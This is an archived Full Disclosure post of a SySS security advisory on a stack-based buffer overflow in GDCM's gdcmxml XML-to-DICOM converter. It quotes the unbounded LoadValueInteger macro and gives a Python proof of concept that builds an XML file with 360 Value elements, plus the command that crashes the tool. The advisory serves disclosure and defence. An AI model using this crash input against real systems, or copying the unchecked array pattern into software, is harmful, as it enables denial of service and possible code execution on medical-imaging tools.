---
title: [SYSS-2026-067]: GDCM (Grassroots DICOM) - Stack-based Buffer Overflow (CWE-121)
url: https://seclists.org/fulldisclosure/2026/Sep/71
source: Full Disclosure
date: 2026-09-27
fetch_date: 2026-09-28T07:56:58.972477
---

# [SYSS-2026-067]: GDCM (Grassroots DICOM) - Stack-based Buffer Overflow (CWE-121)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](83)
[By Date](date.html#71)
[![Next](/images/right-icon-16x16.png)](84)

[![Previous](/images/left-icon-16x16.png)](83)
[By Thread](index.html#71)
[![Next](/images/right-icon-16x16.png)](84)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-067]: GDCM (Grassroots DICOM) - Stack-based Buffer Overflow (CWE-121)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 23 Sep 2026 15:33:17 +0200

---

```
Advisory ID:               SYSS-2026-067
Product:                   GDCM (Grassroots DICOM)
Manufacturer:              GDCM Project
Affected Version(s):       3.3.0
Tested Version(s):         3.3.0
Vulnerability Type:        Stack-based Buffer Overflow (CWE-121)
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2026-07-24
Public Disclosure:         2026-09-23
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

GDCM (Grassroots DICOM) is an open-source C++ library for reading, writing,
and processing DICOM (Digital Imaging and Communications in Medicine)
medical imaging files (see [1]).

GDCM's command-line tool gdcmxml, which converts between XML and DICOM
file formats, is vulnerable to a stack-based buffer overflow in the
LoadValueInteger macro. An attacker who can control the XML input
supplied to the gdcmxml command-line application can cause an unbounded
stack buffer overflow, potentially leading to a process crash or arbitrary
code execution in the context of the user running the application.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The gdcmxml application (Applications/Cxx/gdcmxml.cxx) contains a series
of macros for loading DICOM attribute values from XML, including
LoadValueInteger (line 344), LoadValueFloat (line 374), and LoadValueDouble
(line 403). The LoadValueInteger macro declares a fixed-size stack array
and populates it using sscanf() without any bounds checking on the
element count:

  #define LoadValueInteger(type) \
    case type: \
      { \
      int count = 0; \
      int values[10]; \
      Element<type,VM::VM1_n> el; \
      while(strcmp(name,"Value") == 0) \
        { \
        READ_NEXT \
        char *value_char = (char*)xmlTextReaderConstValue(reader); \
        int nvalue = sscanf(value_char, "%d", &(values[count++]));  \
        gdcm_assert( nvalue == 1 ); (void)nvalue; \
        READ_NEXT /*Value ending tag*/ \
        name = (const char*)xmlTextReaderConstName(reader); \
        READ_NEXT \
        name = (const char*)xmlTextReaderConstName(reader); \
        } \
      el.SetLength( (count) * vr.GetSizeof() ); \
      int total = 0; \
      while(total < count) \
        { \
        el.SetValue( (VRToType<VR::type>::Type)(values[total]), total); \
        total++; \
        } \
      de = el.GetAsDataElement(); \
      }break

The variable 'count' is incremented in the loop via the post-increment
operator in the sscanf call (values[count++]) but is never checked against
the array size (10). Any XML input with more than 10 <Value> elements for
a VR handled by LoadValueInteger (IS, SS, UL, SL, US) overflows the
int values[10] array.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

For demonstrating the sscanf() overflow vulnerability in LoadValueInteger,
a simple PoC non-control-data exploit was developed that crashes the
application.

For this, a malicious XML file with 360 "Value" elements is used. The
sscanf() overflow corrupts a pointer at values[304] on the stack, which is
loaded and dereferenced causing a segmentation fault.

The following Python script creates the malicious XML file:

cat > sscanf_overflow_poc.py << 'PYEOF'
import sys

num_values = 360
output = "sscanf_overflow_poc.xml"

xml = b'<?xml version="1.0" encoding="UTF-8"?>\n'
```

xml += b'<NativeDicomModel
xmlns="[http://dicom.nema.org/PS3.19/models/NativeDICOM"](http://dicom.nema.org/PS3.19/models/NativeDICOM%22);>\n'

```
xml += b'<DicomAttribute tag = "00200010" vr = "IS" keyword = "StudyID">\n'

for i in range(1, num_values + 1):
```

 xml += b'<Value number = "' + str(i).encode() + b'" >' +
str(i).encode() + b'</Value>\n'

```
xml += b'</DicomAttribute>\n'
xml += b'</NativeDicomModel>'

with open(output, 'wb') as f:
    f.write(xml)

overflow_elements = num_values - 10
PYEOF
```

Using this crafted XML file as input file crashes gdcmxml with a
segmentation fault:

```
$ gdcmxml -i sscanf_overflow_poc.xml -o out.dcm
```

[1] 78018 segmentation fault (core dumped) gdcmxml -i
sscanf\_overflow\_poc.xml -o out.dcm

```
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

SySS GmbH is not aware of a security update for the described issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2026-07-24: Vulnerability reported to manufacturer
2026-07-31: Vulnerability reported to manufacturer again
2026-09-23: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] GDCM project website
    https://gdcm.sourceforge.net/
[2] SySS Security Advisory SYSS-2026-067
```

<https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-067.txt>

```
[3] SySS GmbH, SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Matthias Deeg of SySS GmbH with
the assistance of SySS AI.

E-Mail: matthias.deeg (at) syss.de
```

Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc>

```
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS
website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 4.0
URL: https://creativecommons.org/licenses/by/4.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-71/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](83)
[By Date](date.html#71)
[![Next](/images/right-icon-16x16.png)](84)

[![Previous](/images/left-icon-16x16.png)](83)
[By Thread](index.html#71)
[![Next](/images/right-icon-16x16.png)](84)

### Current thread:

* **[SYSS-2026-067]: GDCM (Grassroots DICOM) - Stack-based Buffer Overflow (CWE-121)** *Matthias Deeg via Fulldisclosure (Sep 26)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap O...